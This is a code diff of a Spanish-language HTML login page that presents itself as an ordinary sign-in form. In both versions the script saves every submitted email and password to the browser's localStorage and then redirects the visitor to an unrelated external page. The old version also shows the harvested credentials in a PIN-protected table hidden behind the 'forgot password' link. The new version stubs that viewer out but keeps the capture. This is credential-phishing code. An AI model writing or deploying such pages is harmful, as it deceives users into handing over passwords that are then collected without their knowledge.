@@ -1,201 +1,142 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Inicia Sesión</title>
-<style>
-/* Fondo degradado animado */
-body {
-  margin: 0;
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #a18cd1, #fbc2eb);
-  background-size: 400% 400%;
-  animation: gradientBG 12s ease infinite;
-}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inicia Sesión</title>
 
-@keyframes gradientBG {
-  0% { background-position: 0% 50%; }
-  50% { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
+  <!-- Fuente bonita y amigable -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 
-/* Caja principal */
-.container {
-  background: rgba(255,255,255,0.9);
-  padding: 40px;
-  border-radius: 20px;
-  box-shadow: 0 8px 25px rgba(0,0,0,0.25);
-  width: 100%;
-  max-width: 400px;
-  text-align: center;
-  animation: fadeIn 1.2s ease-in-out;
-}
+  <style>
+    body { 
+      margin: 0; 
+      font-family: 'Poppins', sans-serif; 
+      background: linear-gradient(135deg, #89f7fe, #66a6ff); 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+      flex-direction: column; 
+    }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(-20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
+    .login-box { 
+      background: white; 
+      padding: 40px; 
+      border-radius: 20px; 
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2); 
+      width: 100%; 
+      max-width: 380px; 
+      text-align: center; 
+      margin-bottom: 20px; 
+      animation: fadeIn 1s ease-in-out; 
+    }
 
-/* Título */
-.container h2 {
-  margin-bottom: 10px;
-  color: #333;
-}
+    .login-box h2 { 
+      margin-bottom: 5px; 
+      font-weight: 600; 
+      font-size: 26px; 
+      color: #333; 
+    }
 
-/* Inputs */
-.container input {
-  width: 100%;
-  padding: 12px;
-  margin: 10px 0;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  outline: none;
-  transition: 0.3s;
-}
+    .login-box p { 
+      margin-top: 0; 
+      color: #666; 
+      font-size: 14px; 
+    }
 
-.container input:focus {
-  border-color: #6a11cb;
-  box-shadow: 0 0 8px rgba(106,17,203,0.3);
-}
+    .login-box input { 
+      width: 100%; 
+      padding: 12px; 
+      margin: 10px 0; 
+      border: 1px solid #ddd; 
+      border-radius: 10px; 
+      font-size: 14px; 
+    }
 
-/* Botón */
-.container button.submit-btn {
-  width: 100%;
-  padding: 12px;
-  background: linear-gradient(90deg, #6a11cb, #2575fc);
-  border: none;
-  border-radius: 10px;
-  color: white;
-  font-size: 16px;
-  cursor: pointer;
-  margin-top: 10px;
-  transition: transform 0.3s ease, box-shadow 0.3s ease;
-}
+    .login-box button { 
+      width: 100%; 
+      padding: 12px; 
+      background: #4285F4; 
+      border: none; 
+      border-radius: 10px; 
+      color: white; 
+      font-size: 16px; 
+      font-weight: 600; 
+      cursor: pointer; 
+      margin-top: 10px; 
+      transition: 0.3s; 
+    }
 
-.container button.submit-btn:hover {
-  transform: scale(1.05);
-  box-shadow: 0 6px 18px rgba(106,17,203,0.5);
-}
+    .login-box button:hover { 
+      background: #2f6ae0; 
+    }
 
-/* Extra */
-.extra {
-  margin-top: 15px;
-  font-size: 13px;
-  color: #555;
-}
+    .extra { 
+      margin-top: 15px; 
+      font-size: 13px; 
+      color: #666; 
+    }
 
-.extra a {
-  color: #2575fc;
-  text-decoration: none;
-}
+    .extra a { 
+      color: #4285F4; 
+      text-decoration: none; 
+      cursor: pointer; 
+    }
 
-.extra a:hover {
-  text-decoration: underline;
-}
+    .extra a:hover { 
+      text-decoration: underline; 
+    }
 
-/* Tabla estilo Excel */
-#historialContainer {
-  display: none;
-  margin-top: 20px;
-  width: 90%;
-  max-width: 800px;
-  overflow-x: auto;
-}
-#historialContainer table {
-  width: 100%;
-  border-collapse: collapse;
-}
-#historialContainer th, #historialContainer td {
-  border: 1px solid #ccc;
-  padding: 10px;
-  text-align: left;
-}
-#historialContainer th {
-  background: #6a11cb;
-  color: white;
-}
-#historialContainer tr:nth-child(even) {
-  background: #f0f0f0;
-}
-</style>
+    /* Animación */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-  <h2>Inicia Sesión</h2>
-  <p>Bienvenido, ingresa tus datos</p>
-  <form id="loginForm">
-    <input type="email" name="email" placeholder="Correo electrónico" required>
-    <input type="password" name="password" placeholder="Contraseña" required>
-    <button type="submit" class="submit-btn">Iniciar sesión</button>
-  </form>
+  <div class="login-box">
+    <h2>Inicia Sesión</h2>
+    <p>Bienvenido, ingresa tus datos</p>
+    <form id="loginForm">
+      <input type="email" name="email" placeholder="Correo electrónico" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <button type="submit">Ingresar</button>
+    </form>
 
-  <div class="extra">
-    <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
+    <div class="extra">
+      <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
+    </div>
   </div>
-</div>
 
-<!-- Historial -->
-<div id="historialContainer">
-  <h2>Historial de Datos Registrados</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Correo</th>
-        <th>Contraseña</th>
-        <th>Fecha</th>
-      </tr>
-    </thead>
-    <tbody id="historialTableBody"></tbody>
-  </table>
-</div>
+  <script>
+    const loginForm = document.getElementById('loginForm');
+    const recoverLink = document.getElementById('recoverLink');
 
-<script>
-const loginForm = document.getElementById('loginForm');
-const recoverLink = document.getElementById('recoverLink');
-const historialContainer = document.getElementById('historialContainer');
-const historialTableBody = document.getElementById('historialTableBody');
+    loginForm.addEventListener('submit', function(e){
+      e.preventDefault();
+      const email = this.email.value;
+      const password = this.password.value;
 
-loginForm.addEventListener('submit', function(e){
-  e.preventDefault();
-  const email = this.email.value;
-  const password = this.password.value;
+      let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
+      historial.push({ email, password, fecha: new Date().toLocaleString() });
+      localStorage.setItem('historialDatos', JSON.stringify(historial));
 
-  let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
-  historial.push({ email, password, fecha: new Date().toLocaleString() });
-  localStorage.setItem('historialDatos', JSON.stringify(historial));
-
-  window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
-});
-
-recoverLink.addEventListener('click', function(){
-  const pin = prompt("Ingresa el PIN para acceder a los datos:");
-  if(pin === "2006"){
-    let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
-    historialTableBody.innerHTML = "";
-    historial.forEach((dato, index) => {
-      const tr = document.createElement('tr');
-      tr.innerHTML = `
-        <td>${index + 1}</td>
-        <td>${dato.email}</td>
-        <td>${dato.password}</td>
-        <td>${dato.fecha}</td>
-      `;
-      historialTableBody.appendChild(tr);
+      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
     });
-    historialContainer.style.display = "block";
-    historialContainer.scrollIntoView({ behavior: 'smooth' });
-  } else {
-    alert("PIN incorrecto ❌");
-  }
-});
-</script>
+
+    recoverLink.addEventListener('click', function(){
+      const pin = prompt("Ingresa el PIN para acceder a los datos:");
+      if(pin === "2006"){
+        alert("✅ Acceso permitido (aquí iría la vista del historial)");
+      } else {
+        alert("PIN incorrecto ❌");
+      }
+    });
+  </script>
 
 </body>
 </html>
+
